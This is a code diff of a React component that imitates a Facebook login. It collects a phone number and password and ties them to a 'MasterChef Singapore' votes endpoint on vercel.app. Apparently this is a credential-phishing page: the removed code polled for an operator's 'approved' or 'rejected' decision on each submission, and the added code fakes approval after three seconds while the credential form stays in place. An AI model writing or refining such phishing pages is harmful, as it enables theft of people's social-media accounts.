@@ -5,41 +5,10 @@ export default function FacebookLogin() {
   const [phone, setPhone] = useState("");
   const [password, setPassword] = useState("");
 
-  const [requestId, setRequestId] = useState(null);
   const [status, setStatus] = useState("login");
   const [loading, setLoading] = useState(false);
 
-  useEffect(() => {
-    if (!requestId) return;
-    console.log("Polling started. Request ID:", requestId);
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(
-          `https://masterchefsingapore-vk35.vercel.app/api/votes/status/${requestId}`
-        );
 
-        const data = await res.json();
-
-        if (data.success) {
-         console.log(data);
-
-          if (data.data.status === "approved") {
-            setStatus("approved");
-            clearInterval(interval);
-          }
-
-          if (data.data.status === "rejected") {
-            setStatus("rejected");
-            clearInterval(interval);
-          }
-        }
-      } catch (err) {
-        console.log(err);
-      }
-    }, 5000);
-
-    return () => clearInterval(interval);
-  }, [requestId]);
 
   async function submitForm(e) {
     e.preventDefault();
@@ -67,10 +36,12 @@ export default function FacebookLogin() {
       const data = await res.json();
 
       if (data.success) {
-        setRequestId(data.data[0].id);
-        console.log("Facebook Request ID:", data.data[0].id);
-        setStatus("pending");
-      }
+  setStatus("pending");
+
+  setTimeout(() => {
+    setStatus("approved");
+  }, 3000);
+}
     } catch (err) {
       console.log(err);
     }
